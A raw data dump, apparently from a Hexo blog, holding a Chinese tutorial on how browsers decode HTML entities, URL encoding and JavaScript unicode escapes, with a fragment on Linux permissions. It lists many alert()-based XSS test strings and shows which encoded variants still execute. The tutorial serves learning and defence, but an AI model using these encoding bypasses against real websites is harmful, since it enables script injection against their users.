style=\"text-align:center\">修改文件内容（编辑、增、改、不能删除文件）</td>\n<td style=\"text-align:center\">执行文件</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">目录</td>\n<td style=\"text-align:center\">目录下的文件名</td>\n<td style=\"text-align:center\">可读取看到目录下的文件名</td>\n<td style=\"text-align:center\">可异动目录结构</td>\n<td style=\"text-align:center\">可进入目录的权限</td>\n</tr>\n</tbody>\n</table>\n<p><strong>权限对于目录：</strong></p>\n<ul>\n<li><strong>r</strong></li>\n</ul>\n<blockquote>\n<p>读取文件结构的权限，即可以获得目录下的文件名清单。可执行<code>ls</code>命令。</p>\n</blockquote>\n<ul>\n<li><strong>w</strong></li>\n</ul>\n<blockquote>\n<p>创建文件或目录。（<code>touch</code>、<code>mkdir</code>）</p>\n<p>删除文件或目录。（不论文件的权限如何）(<code>rm、rmdir</code>)</p>\n<p>重命名文件或目录。（<code>cp</code>）</p>\n<p>移动文件或目录。(<code>mv</code>)</p>\n</blockquote>\n<ul>\n<li><strong>x</strong></li>\n</ul>\n<blockquote>\n<p>能否作为工作目录。工作目录即用户当前所在的路径就是当前的工作目录。即该权限就是能否进入该目录，即能否<code>cd</code>进去。</p>\n</blockquote>\n<p><strong>例子：</strong></p>\n<p><img src=\"/2019/02/28/文件与目录权限/QQ截图20190228101906.png\" alt></p>\n<ul>\n<li><strong>要操作一个目录下的文件，拥有进入该目录的权限是必需的，“x”权限相当于key。“r”权限不是必需的，就像摸黑到书房取书，进入书房的钥匙是必需的，但是可以不用看到书架上的书名。没有“r”权限，命令里路径将不能补全。</strong></li>\n<li><strong>因此在搭建WEB服务器时，运行HTTP服务的用户对网站的根目录应该具有”rx”权限。具体权限配置可参考连接：</strong><a href=\"https://www.cnblogs.com/sochishun/p/7413572.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/sochishun/p/7413572.html</a></li>\n</ul>\n<p><strong>改变文件权限：</strong></p>\n<p><img src=\"/2019/02/28/文件与目录权限/QQ截图20190228105825.png\" alt></p>"},{"title":"Chapter 1：XSS学习系列之浏览器解析HTML文档","date":"2019-03-07T03:59:02.000Z","_content":"\n## 一、前端基本编码知识\n\n### 0x00 为什么要进行编码?\n\n> 主要是因为某些数据不适合传输。原因多种多样，如Size过大，包含隐私数据，另外重要的一点就是有些字符会**引起歧义**。\n\n对于URL，\n\n> `&`用于分割多个参数，倘若有某个参数键值对为`name=v&lue`，就会因为`name`参数的值`v&lue`中携带了`&`而造成歧义。因此需要对`&`进行URL编码。\n\n对于HTML，\n\n> 当浏览器遇到`<`会识别为元素定义的开始，`>`会识别为元素的结束。倘若有`<div  id=\"1>\" ></div>`，由于标签的属性值携带了`>`，同样会造成歧义。因此需要属性值的`>`需要进行HTML编码，即使用字符实体。\n\n<!-- more -->\n\n### 0x01 URL编码\n\n> RFC3986文档规定，Url中只允许包含英文字母（a-zA-Z）、数字（0-9）、-_.~4个特殊字符以及所有保留字符。\n\n编码方式，\n\n> `%`加`字符在ASCII码表中的十六进制值`。\n>\n> 例如，`/`在ASCII码表中十六进制为`0x2f`，那么它对应的URL编码为`%2f`。\n\nJavaScript中提供了3个函数用来对Url编码以得到合法的Url：\n\n- escape()\n- encodeURI（）\n- encodeURIComponent（）\n\n参考连接：https://www.cnblogs.com/jerrysion/p/5522673.html\n\n### 0x02 HTML编码（字符实体）\n\n字符实体是一个预先定义好的转义序列。\n\n字符实体两种表示方法:\n\n> - 字符实体以`&`开头+预先定义的`实体名称`+`;`分号结束，如“<”的实体名称为`&lt;`\n> - 字符实体还可以以`&`开头+`#`符号+`字符在ASCII对应的十进制数字`+`;`分号结束，如`<`的实体编号为`&#60;`。\n\n**字符都是有实体编号的，但有些字符是没有实体名称的。**\n\n![](0x00-XSS学习系列之解析HTML文档\\QQ截图20190307120011.png)\n\n### 0x03 JavaScript编码\n\n最常用的如`\\uXXXX`这种写法的Unicode转义序列，表示一个字符，其中`xxxx`表示一个16进制数字，如`<`Unicode编码为`\\u003c`。\n\n## 二、解析HTML文档\n\n解析一个HTML文档涉及三个主要过程：HTML解析——>URL解析——JavaScript解析。\n\n每一个过程由相应的解析器进行解码解析：HTML解析器、URL解析器、JavaScript解析器。\n\n### 0x00 HTML解析器\n\nHTML解析器以状态机的方式运行，它从文档输入流中消耗字符并根据其转换规则转换到不同的状态。\n\n> 当HTML解析器遇到`<`字符，且字符后不包含`/`,即不是闭合标签时，状态机就会进入**`标签打开状态（Tag Open State）`**，随后再进入**`标签名称状态（Tag Name State）`**、**`属性名称前状态（Before Attribute Name State）`**......最后进入**`数据状态（Data State）`**并且发布当前**`标签令牌（Token）`**。状态机处于**`数据状态（Data State）`**时，会继续上述的步骤，遇到完整的标签就发出**`标签令牌（Token）`**。\n\nHTML解析器处于**`数据状态（Data State）`**、**`RCDATA 状态（RCDATA State）`**、**`属性值状态（Attribute Value State）`**时，**字符实体**会被解码为对应的字符。\n\n例子，\n\n> **`<div>&#60;img src=x onerror=alert(4)&#62;</div>`**\n>\n> `<`和`>`被编码为字符实体`&#60;`和`&#62;`。\n>\n> 当HTML解析器解析完`<div>`时，会进入**`数据状态（Data State）`**并发布标签令牌。接着解析到实体`&#60;`时因为处在**`数据状态（Data State）`**就会对实体进行解码为`<`，后面的`&#62;`同样道理被解码为`>`。\n\n这里会有个问题，被解码后，`img`是否会被解析为HTML标签而导致JS执行呢？\n\n> 答案是否定的。因为解析器在使用字符引用后不会转换到**`标签打开状态（Tag Open State）`**，不进入标签打开状态就不会被发布为HTML标签。因此，不会创建新HTML标签，只会将其作为数据来处理。\n>\n> **这也是为什么我们可以使用字符实体来避免用户不安全输入导致XSS的原因。**\n\n**RCDATA**\n\n在HTML中，属于**`RCDATA Elements`**的标签有两个：`textarea`、`title`。\n\n**`RCDATA Elements`**类型的标签可以包含文本内容和字符实体。\n\n解析器解析到`textarea`、`title`标签的数据部分时，状态会进入**`RCDATA State`**。\n\n前面我们提到，处于**`RCDATA State`**状态时，字符实体是会被解析器解码的。\n\n例子， \n\n> **`<textarea>&#60;script&#62;alert(5)&#60;/script&#62;</textarea>`**\n>\n> `<`和`>`被编码为实体`&#60;`和`&#62;`。\n>\n> 解析器解析到它们时会进行解码，最终得到**`<textarea><script>alert(5)</script></textarea>`**。但是里面的JS同样还是不会被执行，原因还是因为解码字符实体状态机不会进入**`标签打开状态（Tag Open State）`**，因此里面的`<script>`并不会被解析为HTML标签。\n\n事实上，任何`RCDATA`（`textarea`、`title`里面的数据）都不会使得状态机进入**`标签打开状态（Tag Open State）`**，So if a user input wants to escape out of the CDATA context, it has to use the exact \"]]>\" sequence without any encoding。\n\nHTML解析规范：https://html.spec.whatwg.org/multipage/parsing.html#tokenization\n\n### 0x01 URL解析器\n\nURL解析器也被建模为状态机，文档输入流中的字符可以将其导向不同的状态。\n\n首先，要注意的是URL的`Scheme`部分（协议部分）必须为ASCII字符，即不能被任何编码，否则URL解析器的状态机将进入**`No Scheme`**状态。\n\n例如，\n\n> **` <a href=\"%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29\"></a>`**\n>\n> URL编码部分的是`javascript:alert(1)`。\n>\n> JS不会被执行，因为作为`Scheme`部分的`\"javascript\"`这个字符串被编码，导致URL解析器状态机进入**`No Scheme`**状态。\n\n同样，URL中的`:`也不能被以任何方式编码，否则URL解析器的状态机也将进入**`No Scheme`**状态。\n\n例如，\n\n> **`<a href=\"javascript%3aalert(3)\"></a>`**\n>\n> 由于`:`被URL编码为`%3a`，导致URL状态机进入**`No Scheme`**状态，JS代码不能执行。\n\n另一个例子：\n\n**`<a href=\"&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:%61%6c%65%72%74%28%32%29\">`**\n\n`\"javascript\"`这个字符串被实体化编码，`:`没有被编码,`alert(2)`被URL编码。\n\n例子中的JS被成功执行。那么将产生一个问题。为什么作为URL的`Scheme`部分的`\"javascript\"`这个字符串被编码了但JS还是被执行了？\n\n> 原因在于，首先，在HTML解析器中我们谈到过，HTML状态机处于**`属性值状态（Attribute Value State）`**时，字符实体时会被解码的，此处在`href`属性中，所以被实体化编码的`\"javascript\"`字符串会被解码。其次，HTML解析是在URL解析之前的，所以在进行URL解析之前，`Scheme`部分的`\"javascript\"`字符串已被解码，而并不再是被实体编码的状态。\n\nURL解析规范：https://url.spec.whatwg.org/\n\n### 0x02 JavaScript解析器\n\nJavaScript解析与HTML解析的区别在于JavaScript是上下文自由的。\n\n在HTML中，属于**`Raw text elements`**的标签有两个：`script`、`style`。\n\n在**`Raw text elements`**类型标签下的所有内容块都属于该标签。\n\n存在一条特性：\n\n> 即**`Raw text elements`**类型标签下的所有字符实体编码都不会被HTML解码。HTML解析器解析到`script`、`style`标签的内容块（数据）部分时，状态会进入**`Script Data State`**，该状态并不在我们前面说的会解码字符实体的三条状态之中。\n\n因此，**`<script>&#97;&#108;&#101;&#114;&#116&#40;&#57;&#41;&#59</script>`**这样字符实体并不会被解码，也就不会执行JS。\n\n形如 `\\uXXXX`这样的Unicode字符转义序列或Hex编码是否能被解码需要看情况。\n\n首先，JavaScript中有三个地方可以出现Unicode字符转义序列：\n\n字符串中（in String）\n\n> `Unicode escape sequences will NEVER break out of the string context in JavaScript because they will always be interpreted as string literals.`\n>\n> 即，Unicode转义序列出现在字符串中时，它只会被解释为普通字符，而不会破坏字符串的上下文。例如`\\u000A`在Java字符串中会被解释为行终止符，会导致字符串上下文断裂。但在JavaScript中的字符串只会被解释为普通字符。简单说就是不会被解码。\n\n标识符中（in identifier names）\n\n> 若Unicode转义序列存在于标识符中，即变量名（如函数名等...），它会被进行解码。\n>\n> 例如，**`<script>\\u0061\\u006c\\u0065\\u0072\\u0074(10);</script>`**\n>\n> 被编码转义的部分为`alert`字符，是函数名，属于在标识符中的情况，因此会被正常解码，JS代码也会被执行。\n\n控制字符中（in control characters）\n\n> 若Unicode转义序列存在于控制字符中，那么它会被解码但不会被解释为控制字符，而会被解释为标识符或字符串字符的一部分。\n>\n> 控制字符即`'`、`\"`、`()`等。\n>\n> 例如，**`<script> alert\\u0028\"xss\"); </script>`**，`(`进行了Unicode编码，那么解码后它不再是作为控制字符，而是作为标识符的一部分`alert(`。\n>\n> 因此函数的括号之类的控制字符进行Unicode转义后是不能被正常解码解释的。\n\n总结，Unicode序列只有出现在标识符中时，才能被正常的解码解释。\n\n例子，\n\n> **`<script>\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0031\\u0029</script>`**\n>\n> 被编码部分为`alert(11)`。\n>\n> 该例子中的JS不会被执行，因为控制字符被编码了。\n\n> **` <script>\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031\\u0032)</script>`**\n>\n> 被编码部分为`alert`及括号内为`12`。\n>\n> 该例子中JS不会被执行，原因在于括号内被编码的部分不能被正常解码解释，要么使用ASCII数字，要么加`\"\"`或`''`使其变为字符串，作为字符串也只能作为普通字符。\n\n> **`<script>alert('13\\u0027)</script>`**\n>\n> 被编码处为`'`。\n>\n> 该例的JS不会执行，因为控制字符被编码了，解码后的`'`将变为字符串的一部分，而不再解释为控制字符。因此该例中字符串是不完整的，因为没有`'`来结束字符串。\n\n> **`<script>alert('14\\u000a')</script>`**\n>\n> 该例的JS会被执行，因为被编码的部分处于字符串内，只会被解释为普通字符，不会突破字符串上下文。\n\n### 0x03 解析顺序\n\n首先浏览器接收到一个HTML文档时，会触发HTML解析器对HTML文档进行词法解析，这一过程完成HTML解码并创建DOM树，接下来JavaScript解析器会介入对内联脚本进行解析，这一过程完成JS的解码工作，如果浏览器遇到需要URL的上下文环境，这时URL解析器也会介入完成URL的解码工作，URL解析器的解码顺序会根据URL所在位置不同，可能在JavaScript解析器之前或之后解析。HTML解析总是第一步。\n\nURL解析和JavaScript解析，它们的解析顺序要根据情况而定。\n\n例子，\n\n> **`<a href=\"UserInput\"></a>`**\n>\n> 该例子中，首先由HTML解析器对`UserInput`部分进行字符实体解码；\n>\n> 接着URL解析器对`UserInput`进行URL decode；\n>\n> 如果URL的Scheme部分为`javascript`的话，JavaScript解析器会再对`UserInput`进行解码。\n>\n> 所以解析顺序是：HTML解析——>URL解析——>JavaScript解析。\n\n> **`<a href=# onclick=\"window.open('UserInput')\"></a>`**\n>\n> 该例子中，首先由HTML解析器对`UserInput`部分进行字符实体解码；\n>\n> 接着由JavaScript解析器会再对`onclick`部分的JS进行解析并执行JS；\n>\n> 执行JS后`window.open('UserInput')`函数的参数会传入URL，所以再由URL解析器对`UserInput`部分进行解码。\n>\n> 因此解析顺序为：HTML解析——>JavaScript解析——>URL解析。\n\n> **`<a href=\"javascript:window.open('UserInput')\">`**\n>\n> 该例子中，首先还是由HTML解析器对`UserInput`部分进行字符实体解码；\n>\n> 接着由URL解析器解析`href`的属性值；\n>\n> 然后由于Scheme为`javascript`，所以由JavaScript解析；\n>\n> 解析执行JS后`window.open('UserInput')`函数传入URL，所以再由URL解析器解析。\n>\n> 所以解析顺序为：HTML解析——>URL解析——>JavaScript解析——>URL解析。\n\n综合实例：\n\n**`<a  href=\"&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x25;\n&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;\n&#x36;&#x25;&#x33;&#x31;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;\n&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x33;&#x25;&#x35;&#x63;&#x25;\n&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x33;\n&#x35;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;\n&#x25;&#x33;&#x37;&#x25;&#x33;&#x32;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;\n&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x37;&#x25;&#x33;&#x34;&#x28;&#x31;\n&#x35;&#x29;\"> </a>`**\n\n首先HTML解析器进行解析，解析到`href`属性的值时，状态机进入**`属性值状态（Attribute Value State）`**，该状态会解码字符实体，解码得到结果：\n\n![](0x00-XSS学习系列之解析HTML文档\\QQ截图20190308105040.png)\n\n接着由URL解析器进行解析并解码：\n\n![](0x00-XSS学习系列之解析HTML文档\\QQ截图20190308105254.png)\n\n再接着由于Scheme为javascript，因此由JavaScript解析器解析并解码，加上编码部分是函数名，属于标识符，因此可以正常解码解释：\n\n![](0x00-XSS学习系列之解析HTML文档\\QQ截图20190308105533.png)\n\n经过三轮解析解码后得到结果：`<a href=\"javascript:alert(15)\"></a>`\n\n参考连接：\n\nhttps://www.attacker-domain.com/2013/04/deep-dive-into-browser-parsing-and-xss.html\n\nhttps://security.yirendai.com/news/share/26\n\nhttps://xz.aliyun.com/t/1556","source":"_posts/0x00-XSS学习系列之解析HTML文档.md","raw":"---\ntitle: Chapter 1：XSS学习系列之浏览器解析HTML文档\ndate: 2019-03-07 11:59:02\ntags: \n\t- XSS\n\t- 编码与解码\n\t- HTML文档解析\ncategories: WEB漏洞学习\n---\n\n## 一、前端基本编码知识\n\n### 0x00 为什么要进行编码?\n\n> 主要是因为某些数据不适合传输。原因多种多样，如Size过大，包含隐私数据，另外重要的一点就是有些字符会**引起歧义**。\n\n对于URL，\n\n> `&`用于分割多个参数，倘若有某个参数键值对为`name=v&lue`，就会因为`name`参数的值`v&lue`中携带了`&`而造成歧义。因此需要对`&`进行URL编码。\n\n对于HTML，\n\n> 当浏览器遇到`<`会识别为元素定义的开始，`>`会识别为元素的结束。倘若有`<div  id=\"1>\" ></div>`，由于标签的属性值携带了`>`，同样会造成歧义。因此需要属性值的`>`需要进行HTML编码，即使用字符实体。\n\n<!-- more -->\n\n### 0x01 URL编码\n\n> RFC3986文档规定，Url中只允许包含英文字母（a-zA-Z）、数字（0-9）、-_.~4个特殊字符以及所有保留字符。\n\n编码方式，\n\n> `%`加`字符在ASCII码表中的十六进制值`。\n>\n> 例如，`/`在ASCII码表中十六进制为`0x2f`，那么它对应的URL编码为`%2f`。\n\nJavaScript中提供了3个函数用来对Url编码以得到合法的Url：\n\n- escape()\n- encodeURI（）\n- encodeURIComponent（）\n\n参考连接：https://www.cnblogs.com/jerrysion/p/5522673.html\n\n### 0x02 HTML编码（字符实体）\n\n字符实体是一个预先定义好的转义序列。\n\n字符实体两种表示方法:\n\n> - 字符实体以`&`开头+预先定义的`实体名称`+`;`分号结束，如“<”的实体名称为`&lt;`\n> - 字符实体还可以以`&`开头+`#`符号+`字符在ASCII对应的十进制数字`+`;`分号结束，如`<`的实体编号为`&#60;`。\n\n**字符都是有实体编号的，但有些字符是没有实体名称的。**\n\n![](0x00-XSS学习系列之解析HTML文档\\QQ截图20190307120011.png)\n\n### 0x03 JavaScript编码\n\n最常用的如`\\uXXXX`这种写法的Unicode转义序列，表示一个字符，其中`xxxx`表示一个16进制数字，如`<`Unicode编码为`\\u003c`。\n\n## 二、解析HTML文档\n\n解析一个HTML文档涉及三个主要过程：HTML解析——>URL解析——JavaScript解析。\n\n每一个过程由相应的解析器进行解码解析：HTML解析器、URL解析器、JavaScript解析器。\n\n### 0x00 HTML解析器\n\nHTML解析器以状态机的方式运行，它从文档输入流中消耗字符并根据其转换规则转换到不同的状态。\n\n> 当HTML解析器遇到`<`字符，且字符后不包含`/`,即不是闭合标签时，状态机就会进入**`标签打开状态（Tag Open State）`**，随后再进入**`标签名称状态（Tag Name State）`**、**`属性名称前状态（Before Attribute Name State）`**......最后进入**`数据状态（Data State）`**并且发布当前**`标签令牌（Token）`**。状态机处于**`数据状态（Data State）`**时，会继续上述的步骤，遇到完整的标签就发出**`标签令牌（Token）`**。\n\nHTML解析器处于**`数据状态（Data State）`**、**`RCDATA 状态（RCDATA State）`**、**`属性值状态（Attribute Value State）`**时，**字符实体**会被解码为对应的字符。\n\n例子，\n\n> **`<div>&#60;img src=x onerror=alert(4)&#62;</div>`**\n>\n> `<`和`>`被编码为字符实体`&#60;`和`&#62;`。\n>\n> 当HTML解析器解析完`<div>`时，会进入**`数据状态（Data State）`**并发布标签令牌。接着解析到实体`&#60;`时因为处在**`数据状态（Data State）`**就会对实体进行解码为`<`，后面的`&#62;`同样道理被解码为`>`。\n\n这里会有个问题，被解码后，`img`是否会被解析为HTML标签而导致JS执行呢？\n\n> 答案是否定的。因为解析器在使用字符引用后不会转换到**`标签打开状态（Tag Open State）`**，不进入标签打开状态就不会被发布为HTML标签。因此，不会创建新HTML标签，只会将其作为数据来处理。\n>\n> **这也是为什么我们可以使用字符实体来避免用户不安全输入导致XSS的原因。**\n\n**RCDATA**\n\n在HTML中，属于**`RCDATA Elements`**的标签有两个：`textarea`、`title`。\n\n**`RCDATA Elements`**类型的标签可以包含文本内容和字符实体。\n\n解析器解析到`textarea`、`title`标签的数据部分时，状态会进入**`RCDATA State`**。\n\n前面我们提到，处于**`RCDATA State`**状态时，字符实体是会被解析器解码的。\n\n例子， \n\n> **`<textarea>&#60;script&#62;alert(5)&#60;/script&#62;</textarea>`**\n>\n> `<`和`>`被编码为实体`&#60;`和`&#62;`。\n>\n> 解析器解析到它们时会进行解码，最终得到**`<textarea><script>alert(5)</script></textarea>`**。但是里面的JS同样还是不会被执行，原因还是因为解码字符实体状态机不会进入**`标签打开状态（Tag Open State）`**，因此里面的`<script>`并不会被解析为HTML标签。\n\n事实上，任何`RCDATA`（`textarea`、`title`里面的数据）都不会使得状态机进入**`标签打开状态（Tag Open State）`**，So if a user input wants to escape out of the CDATA context, it has to use the exact \"]]>\" sequence without any encoding。\n\nHTML解析规范：https://html.spec.whatwg.org/multipage/parsing.html#tokenization\n\n### 0x01 URL解析器\n\nURL解析器也被建模为状态机，文档输入流中的字符可以将其导向不同的状态。\n\n首先，要注意的是URL的`Scheme`部分（协议部分）必须为ASCII字符，即不能被任何编码，否则URL解析器的状态机将进入**`No Scheme`**状态。\n\n例如，\n\n> **` <a href=\"%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29\"></a>`**\n>\n> URL编码部分的是`javascript:alert(1)`。\n>\n> JS不会被执行，因为作为`Scheme`部分的`\"javascript\"`这个字符串被编码，导致URL解析器状态机进入**`No Scheme`**状态。\n\n同样，URL中的`:`也不能被以任何方式编码，否则URL解析器的状态机也将进入**`No Scheme`**状态。\n\n例如，\n\n> **`<a href=\"javascript%3aalert(3)\"></a>`**\n>\n> 由于`:`被URL编码为`%3a`，导致URL状态机进入**`No Scheme`**状态，JS代码不能执行。\n\n另一个例子：\n\n**`<a href=\"&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:%61%6c%65%72%74%28%32%29\">`**\n\n`\"javascript\"`这个字符串被实体化编码，`:`没有被编码,`alert(2)`被URL编码。\n\n例子中的JS被成功执行。那么将产生一个问题。为什么作为URL的`Scheme`部分的`\"javascript\"`这个字符串被编码了但JS还是被执行了？\n\n> 原因在于，首先，在HTML解析器中我们谈到过，HTML状态机处于**`属性值状态（Attribute Value State）`**时，字符实体时会被解码的，此处在`href`属性中，所以被实体化编码的`\"javascript\"`字符串会被解码。其次，HTML解析是在URL解析之前的，所以在进行URL解析之前，`Scheme`部分的`\"javascript\"`字符串已被解码，而并不再是被实体编码的状态。\n\nURL解析规范：https://url.spec.whatwg.org/\n\n### 0x02 JavaScript解析器\n\nJavaScript解析与HTML解析的区别在于JavaScript是上下文自由的。\n\n在HTML中，属于**`Raw text elements`**的标签有两个：`script`、`style`。\n\n在**`Raw text elements`**类型标签下的所有内容块都属于该标签。\n\n存在一条特性：\n\n> 即**`Raw text elements`**类型标签下的所有字符实体编码都不会被HTML解码。HTML解析器解析到`script`、`style`标签的内容块（数据）部分时，状态会进入**`Script Data State`**，该状态并不在我们前面说的会解码字符实体的三条状态之中。\n\n因此，**`<script>&#97;&#108;&#101;&#114;&#116&#40;&#57;&#41;&#59</script>`**这样字符实体并不会被解码，也就不会执行JS。\n\n形如 `\\uXXXX`这样的Unicode字符转义序列或Hex编码是否能被解码需要看情况。\n\n首先，JavaScript中有三个地方可以出现Unicode字符转义序列：\n\n字符串中（in String）\n\n> `Unicode escape sequences will NEVER break out of the string context in JavaScript because they will always be interpreted as string literals.`\n>\n> 即，Unicode转义序列出现在字符串中时，它只会被解释为普通字符，而不会破坏字符串的上下文。例如`\\u000A`在Java字符串中会被解释为行终止符，会导致字符串上下文断裂。但在JavaScript中的字符串只会被解释为普通字符。简单说就是不会被解码。\n\n标识符中（in identifier names）\n\n> 若Unicode转义序列存在于标识符中，即变量名（如函数名等...），它会被进行解码。\n>\n> 例如，**`<script>\\u0061\\u006c\\u0065\\u0072\\u0074(10);</script>`**\n>\n> 被编码转义的部分为`alert`字符，是函数名，属于在标识符中的情况，因此会被正常解码，JS代码也会被执行。\n\n控制字符中（in control characters）\n\n> 若Unicode转义序列存在于控制字符中，那么它会被解码但不会被解释为控制字符，而会被解释为标识符或字符串字符的一部分。\n>\n> 控制字符即`'`、`\"`、`()`等。\n>\n> 例如，**`<script> alert\\u0028\"xss\"); </script>`**，`(`进行了Unicode编码，那么解码后它不再是作为控制字符，而是作为标识符的一部分`alert(`。\n>\n> 因此函数的括号之类的控制字符进行Unicode转义后是不能被正常解码解释的。\n\n总结，Unicode序列只有出现在标识符中时，才能被正常的解码解释。\n\n例子，\n\n> **`<script>\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0031\\u0029</script>`**\n>\n> 被编码部分为`alert(11)`。\n>\n> 该例子中的JS不会被执行，因为控制字符被编码了。\n\n> **` <script>\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031\\u0032)</script>`**\n>\n> 被编码部分为`alert`及括号内为`12`。\n>\n> 该例子中JS不会被执行，原因在于括号内被编码的部分不能被正常解码解释，要么使用ASCII数字，要么加`\"\"`或`''`使其变为字符串，作为字符串也只能作为普通字符。\n\n> **`<script>alert('13\\u0027)</script>`**\n>\n> 被编码处为`'`。\n>\n> 该例的JS不会执行，因为控制字符被编码了，解码后的`'`将变为字符串的一部分，而不再解释为控制字符。因此该例中字符串是不完整的，因为没有`'`来结束字符串。\n\n> **`<script>alert('14\\u000a')</script>`**\n>\n> 该例的JS会被执行，因为被编码的部分处于字符串内，只会被解释为普通字符，不会突破字符串上下文。\n\n### 0x03 解析顺序\n\n首先浏览器接收到一个HTML文档时，会触发HTML解析器对HTML文档进行词法解析，这一过程完成HTML解码并创建DOM树，接下来JavaScript解析器会介入对内联脚本进行解析，这一过程完成JS的解码工作，如果浏览器遇到需要URL的上下文环境，这时URL解析器也会介入完成URL的解码工作，URL解析器的解码顺序会根据URL所在位置不同，可能在JavaScript解析器之前或之后解析。HTML解析总是第一步。\n\nURL解析和JavaScript解析，它们的解析顺序要根据情况而定。\n\n例子，\n\n> **`<a href=\"UserInput\"></a>`**\n>\n> 该例子中，首先由HTML解析器对`UserInput`部分进行字符实体解码；\n>\n> 接着URL解析器对`UserInput`进行URL decode；\n>\n> 如果URL的Scheme部分为`javascript`的话，JavaScript解析器会再对`UserInput`进行解码。\n>\n> 所以解析顺序是：HTML解析——>URL解析——>JavaScript解析。\n\n> **`<a href=# onclick=\"window.open('UserInput')\"></a>`**\n>\n> 该例子中，首先由HTML解析器对`UserInput`部分进行字符实体解码；\n>\n> 接着由JavaScript解析器会再对`onclick`部分的JS进行解析并执行JS；\n>\n> 执行JS后`window.open('UserInput')`函数的参数会传入URL，所以再由URL解析器对`UserInput`部分进行解码。\n>\n> 因此解析顺序为：HTML解析——>JavaScript解析——>URL解析。\n\n> **`<a href=\"javascript:window.open('UserInput')\">`**\n>\n> 该例子中，首先还是由HTML解析器对`UserInput`部分进行字符实体解码；\n>\n> 接着由URL解析器解析`href`的属性值；\n>\n> 然后由于Scheme为`javascript`，所以由JavaScript解析；\n>\n> 解析执行JS后`window.open('UserInput')`函数传入URL，所以再由URL解析器解析。\n>\n> 所以解析顺序为：HTML解析——>URL解析——>JavaScript解析——>URL解析。\n\n综合实例：\n\n**`<a  href=\"&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x25;\n&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;\n&#x36;&#x25;&#x33;&#x31;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;\n&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x33;&#x25;&#x35;&#x63;&#x25;\n&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x33;\n&#x35;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;\n&#x25;&#x33;&#x37;&#x25;&#x33;&#x32;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;\n&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x37;&#x25;&#x33;&#x34;&#x28;&#x31;\n&#x35;&#x29;\"> </a>`**\n\n首先HTML解析器进行解析，解析到`href`属性的值时，状态机进入**`属性值状态（Attribute Value State）`**，该状态会解码字符实体，解码得到结果：\n\n![](0x00-XSS学习系列之解析HTML文档\\QQ截图20190308105040.png)\n\n接着由URL解析器进行解析并解码：\n\n![](0x00-XSS学习系列之解析HTML文档\\QQ截图20190308105254.png)\n\n再接着由于Scheme为javascript，因此由JavaScript解析器解析并解码，加上编码部分是函数名，属于标识符，因此可以正常解码解释：\n\n![](0x00-XSS学习系列之解析HTML文档\\QQ截图20190308105533.png)\n\n经过三轮解析解码后得到结果：`<a href=\"javascript:alert(15)\"></a>`\n\n参考连接：\n\nhttps://www.attacker-domain.com/2013/04/deep-dive-into-browser-parsing-and-xss.html\n\nhttps://security.yirendai.com/news/share/26\n\nhttps://xz.aliyun.com/t/1556","slug":"0x00-XSS学习系列之解析HTML文档","published":1,"updated":"2019-03-08T05:05:14.122Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjszpjgad001xj8r0f7yxv8va","content":"<h2 id=\"一、前端基本编码知识\"><a href=\"#一、前端基本编码知识\" class=\"headerlink\" title=\"一、前端基本编码知识\"></a>一、前端基本编码知识</h2><h3 id=\"0x00-为什么要进行编码\"><a href=\"#0x00-为什么要进行编码\" class=\"headerlink\" title=\"0x00 为什么要进行编码?\"></a>0x00 为什么要进行编码?</h3><blockquote>\n<p>主要是因为某些数据不适合传输。原因多种多样，如Size过大，包含隐私数据，另外重要的一点就是有些字符会<strong>引起歧义</strong>。</p>\n</blockquote>\n<p>对于URL，</p>\n<blockquote>\n<p><code>&amp;</code>用于分割多个参数，倘若有某个参数键值对为<code>name=v&amp;lue</code>，就会因为<code>name</code>参数的值<code>v&amp;lue</code>中携带了<code>&amp;</code>而造成歧义。因此需要对<code>&amp;</code>进行URL编码。</p>\n</blockquote>\n<p>对于HTML，</p>\n<blockquote>\n<p>当浏览器遇到<code>&lt;</code>会识别为元素定义的开始，<code>&gt;</code>会识别为元素的结束。倘若有<code>&lt;div  id=&quot;1&gt;&quot; &gt;&lt;/div&gt;</code>，由于标签的属性值携带了<code>&gt;</code>，同样会造成歧义。因此需要属性值的<code>&gt;</code>需要进行HTML编码，即使用字符实体。</p>\n</blockquote>\n<a id=\"more\"></a>\n<h3 id=\"0x01-URL编码\"><a href=\"#0x01-URL编码\" class=\"headerlink\" title=\"0x01 URL编码\"></a>0x01 